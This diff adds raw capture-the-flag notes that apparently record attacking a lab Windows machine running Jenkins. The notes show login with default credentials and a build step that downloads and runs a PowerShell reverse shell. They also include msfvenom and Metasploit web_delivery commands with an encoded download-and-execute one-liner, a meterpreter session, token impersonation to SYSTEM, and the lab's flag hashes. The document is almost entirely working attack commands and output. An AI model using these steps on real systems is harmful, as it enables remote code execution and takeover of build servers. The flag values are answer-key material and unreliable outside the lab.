@@ -1,0 +1,405 @@
+Date apr/26/2021
+Time sat 11:08:20
+
+
+Connect with http#58;//10.10.31.231:8080/ using admin:admin
+From the dashboard, click on “project”
+From the menu on the left hand side, click on “Configure”.
+Scroll down to the “Build” section and enter a command 
+$ python -m http.server
+$ rlwrap nc -nlvp 1234
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.**.**:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.**.** -Port 1234
+Click on the “Save” button
+Back to the Project view, click on “Build now” from the menu on the left hand side
+Click on the build number that has been added.
+ From the menu, click on “Console output”. From here you will get the result of your command.
+
+``````````task 1````````````````
+booom!!!!!!!!!!
+PS C:\Program Files (x86)\Jenkins\workspace\project>
+PS C:\Users\bruce\Desktop> 
+more user.txt
+79007a09481963edf2e1321abd9ae2a0
+
+````````task 2```````
+└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.2.65.134 LPORT=4545 -f exe -o SHELL.exe
+
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) > set lhost 10.2.65.134
+lhost => 10.2.65.134
+msf6 exploit(multi/handler) > set lport 4242
+lport => 4242
+msf6 exploit(multi/handler) > run 
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.2.65.134:8000/SHELL.exe','SHELL.exe')"
+this doesn't workes using another method 
+
+└─$ msfconsole -q
+msf6 > use exploit/multi/script/web_delivery
+[*] Using configured payload python/meterpreter/reverse_tcp
+msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/script/web_delivery) > options
+
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface t
+                                       o listen on. This must be an address
+                                       on the local machine or 0.0.0.0 to li
+                                       sten on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connection
+                                       s
+   SSLCert                   no        Path to a custom SSL certificate (def
+                                       ault is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (defa
+                                       ult is random)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, t
+                                        hread, process, none)
+   LHOST                      yes       The listen address (an interface may
+                                         be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Python
+
+
+msf6 exploit(multi/script/web_delivery) > set lhost 10.2.65.134
+lhost => 10.2.65.134
+msf6 exploit(multi/script/web_delivery) > set lport 4343
+lport => 4343
+msf6 exploit(multi/script/web_delivery) > set target PSH
+target => PSH
+msf6 exploit(multi/script/web_delivery) > options
+
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface t
+                                       o listen on. This must be an address
+                                       on the local machine or 0.0.0.0 to li
+                                       sten on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connection
+                                       s
+   SSLCert                   no        Path to a custom SSL certificate (def
+                                       ault is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (defa
+                                       ult is random)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, t
+                                        hread, process, none)
+   LHOST     10.2.65.134      yes       The listen address (an interface may
+                                         be specified)
+   LPORT     4343             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   2   PSH
+
+
+msf6 exploit(multi/script/web_delivery) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.2.65.134:4343 
+msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://0.0.0.0:8080/RKDpCFYs
+[*] Local IP: http://10.0.2.15:8080/RKDpCFYs
+[*] Server started.
+[*] Run the following command on the target machine:
+powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABOAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAE4ALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABOAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMgAuADYANQAuADEAMwA0ADoAOAAwADgAMAAvAFIASwBEAHAAQwBGAFkAcwAvAEYANQBXAEYAcQBPAHkAbAA1ACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAyAC4ANgA1AC4AMQAzADQAOgA4ADAAOAAwAC8AUgBLAEQAcABDAEYAWQBzACcAKQApADsA
+[*] 10.10.2.155      web_delivery - Delivering AMSI Bypass (939 bytes)
+[*] 10.10.2.155      web_delivery - Delivering Payload (1900 bytes)
+[*] Sending stage (175174 bytes) to 10.10.2.155
+[*] Meterpreter session 1 opened (10.2.65.134:4343 -> 10.10.2.155:49267) at 2021-04-26 12:09:45 +0530
+
+msf6 exploit(multi/script/web_delivery) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                  Information           Connection
+  --  ----  ----                  -----------           ----------
+  1         meterpreter x86/wind  alfred\bruce @ ALFRE  10.2.65.134:4343 ->
+            ows                   D                     10.10.2.155:49267 (1
+                                                        0.10.2.155)
+
+msf6 exploit(multi/script/web_delivery) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > shell
+Process 872 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Program Files (x86)\Jenkins\workspace\project>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Disabled
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Disabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
+SeCreatePagefilePrivilege       Create a pagefile                         Disabled
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled 
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
+SeTimeZonePrivilege             Change the time zone                      Disabled
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
+
+C:\Program Files (x86)\Jenkins\workspace\project>^Z
+Background channel 1? [y/N]  y
+meterpreter > load incognito
+Loading extension incognito...Success.
+meterpreter > list_tokens -g
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+
+Delegation Tokens Available
+========================================
+\
+BUILTIN\Administrators
+BUILTIN\IIS_IUSRS
+BUILTIN\Users
+NT AUTHORITY\Authenticated Users
+NT AUTHORITY\NTLM Authentication
+NT AUTHORITY\SERVICE
+NT AUTHORITY\This Organization
+NT AUTHORITY\WRITE RESTRICTED
+NT SERVICE\AppHostSvc
+NT SERVICE\AudioEndpointBuilder
+NT SERVICE\BFE
+NT SERVICE\CertPropSvc
+NT SERVICE\CscService
+NT SERVICE\Dnscache
+NT SERVICE\eventlog
+NT SERVICE\EventSystem
+NT SERVICE\FDResPub
+NT SERVICE\iphlpsvc
+NT SERVICE\LanmanServer
+NT SERVICE\MMCSS
+NT SERVICE\PcaSvc
+NT SERVICE\PlugPlay
+NT SERVICE\RpcEptMapper
+NT SERVICE\Schedule
+NT SERVICE\SENS
+NT SERVICE\SessionEnv
+NT SERVICE\Spooler
+NT SERVICE\TrkWks
+NT SERVICE\TrustedInstaller
+NT SERVICE\UmRdpService
+NT SERVICE\UxSms
+NT SERVICE\Winmgmt
+NT SERVICE\WSearch
+NT SERVICE\wuauserv
+
+Impersonation Tokens Available
+========================================
+NT AUTHORITY\NETWORK
+NT SERVICE\AudioSrv
+NT SERVICE\DcomLaunch
+NT SERVICE\Dhcp
+NT SERVICE\DPS
+NT SERVICE\lmhosts
+NT SERVICE\MpsSvc
+NT SERVICE\PolicyAgent
+NT SERVICE\Power
+NT SERVICE\ShellHWDetection
+NT SERVICE\wscsvc
+
+meterpreter > impersonate_token "BUILTIN\Administrators"
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+[+] Delegation token available
+[+] Successfully impersonated user NT AUTHORITY\SYSTEM
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name         Arch  Session  User              Path
+ ---   ----  ----         ----  -------  ----              ----
+ 0     0     [System Pro
+             cess]
+ 4     0     System       x64   0
+ 396   4     smss.exe     x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                         TEM               32\smss.exe
+ 520   1824  cmd.exe      x86   0        alfred\bruce      C:\Windows\SysWOW
+                                                           64\cmd.exe
+ 524   516   csrss.exe    x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                         TEM               32\csrss.exe
+ 572   564   csrss.exe    x64   1        NT AUTHORITY\SYS  C:\Windows\System
+                                         TEM               32\csrss.exe
+ 580   516   wininit.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                         TEM               32\wininit.exe
+ 608   564   winlogon.ex  x64   1        NT AUTHORITY\SYS  C:\Windows\System
+             e                           TEM               32\winlogon.exe
+ 668   580   services.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+             e                           TEM               32\services.exe
+ 676   580   lsass.exe    x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                         TEM               32\lsass.exe
+ 684   580   lsm.exe      x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                         TEM               32\lsm.exe
+ 772   668   svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                         TEM               32\svchost.exe
+ 800   668   svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                         WORK SERVICE      32\svchost.exe
+ 848   668   svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                         WORK SERVICE      32\svchost.exe
+ 872   1500  cmd.exe      x86   0        alfred\bruce      C:\Windows\SysWOW
+                                                           64\cmd.exe
+ 916   668   svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                         AL SERVICE        32\svchost.exe
+ 924   608   LogonUI.exe  x64   1        NT AUTHORITY\SYS  C:\Windows\System
+                                         TEM               32\LogonUI.exe
+ 936   668   svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                         AL SERVICE        32\svchost.exe
+ 988   668   svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                         TEM               32\svchost.exe
+ 1012  668   svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                         TEM               32\svchost.exe
+ 1076  668   svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                         WORK SERVICE      32\svchost.exe
+ 1088  524   conhost.exe  x64   0        alfred\bruce      C:\Windows\System
+                                                           32\conhost.exe
+ 1216  668   spoolsv.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                         TEM               32\spoolsv.exe
+ 1244  668   svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                         AL SERVICE        32\svchost.exe
+ 1360  668   amazon-ssm-  x64   0        NT AUTHORITY\SYS  C:\Program Files\
+             agent.exe                   TEM               Amazon\SSM\amazon
+                                                           -ssm-agent.exe
+ 1400  668   sppsvc.exe   x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                         WORK SERVICE      32\sppsvc.exe
+ 1412  668   svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                         TEM               32\svchost.exe
+ 1440  668   LiteAgent.e  x64   0        NT AUTHORITY\SYS  C:\Program Files\
+             xe                          TEM               Amazon\Xentools\L
+                                                           iteAgent.exe
+ 1468  668   svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                         AL SERVICE        32\svchost.exe
+ 1500  520   powershell.  x86   0        alfred\bruce      C:\Windows\SysWOW
+             exe                                           64\WindowsPowerSh
+                                                           ell\v1.0\powershe
+                                                           ll.exe
+ 1628  668   jenkins.exe  x64   0        alfred\bruce      C:\Program Files
+                                                           (x86)\Jenkins\jen
+                                                           kins.exe
+ 1720  668   svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                         TEM               32\svchost.exe
+ 1824  1628  java.exe     x86   0        alfred\bruce      C:\Program Files
+                                                           (x86)\Jenkins\jre
+                                                           \bin\java.exe
+ 1852  668   Ec2Config.e  x64   0        NT AUTHORITY\SYS  C:\Program Files\
+             xe                          TEM               Amazon\Ec2ConfigS
+                                                           ervice\Ec2Config.
+                                                           exe
+ 1944  524   conhost.exe  x64   0        alfred\bruce      C:\Windows\System
+                                                           32\conhost.exe
+ 2248  668   SearchIndex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+             er.exe                      TEM               32\SearchIndexer.
+                                                           exe
+ 2368  772   WmiPrvSE.ex  x64   0        NT AUTHORITY\NET  C:\Windows\System
+             e                           WORK SERVICE      32\wbem\WmiPrvSE.
+                                                           exe
+ 2492  668   TrustedInst  x64   0        NT AUTHORITY\SYS  C:\Windows\servic
+             aller.exe                   TEM               ing\TrustedInstal
+                                                           ler.exe
+ 2860  524   conhost.exe  x64   0        alfred\bruce      C:\Windows\System
+                                                           32\conhost.exe
+ 3028  668   svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                         TEM               32\svchost.exe
+
+meterpreter > migrate 2064
+[*] Migrating from 1500 to 2064...
+[-] Error running command migrate: Rex::RuntimeError Cannot migrate into non existent process
+meterpreter > shell
+Process 2472 created.
+Channel 2 created.
+meterpreter > migrate 2064
+[*] Migrating from 1500 to 2064...
+[-] Error running command migrate: Rex::RuntimeError Cannot migrate into non existent process
+meterpreter > migrate 3028
+[*] Migrating from 1500 to 3028...
+[*] Migration completed successfully.
+meterpreter > shell
+Process 2484 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>dir
+
+C:\Windows\system32>cd config
+cd config
+
+C:\Windows\System32\config>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E033-3EDD
+
+ Directory of C:\Windows\System32\config
+
+04/26/2021  06:30 AM    <DIR>          .
+04/26/2021  06:30 AM    <DIR>          ..
+10/25/2019  10:46 PM            28,672 BCD-Template
+04/26/2021  06:42 AM        18,087,936 COMPONENTS
+04/26/2021  06:47 AM           262,144 DEFAULT
+07/14/2009  03:34 AM    <DIR>          Journal
+04/26/2021  06:47 AM    <DIR>          RegBack
+10/26/2019  12:36 PM                70 root.txt
+04/26/2021  06:29 AM           262,144 SAM
+04/26/2021  06:42 AM           262,144 SECURITY
+04/26/2021  07:32 AM        38,797,312 SOFTWARE
+04/26/2021  07:43 AM        10,485,760 SYSTEM
+11/21/2010  03:41 AM    <DIR>          systemprofile
+10/25/2019  09:47 PM    <DIR>          TxR
+               8 File(s)     68,186,182 bytes
+               6 Dir(s)  20,425,740,288 bytes free
+
+C:\Windows\System32\config>more root.txt
+more root.txt
+dff0f748678f280250f25a45b8046b4a
+
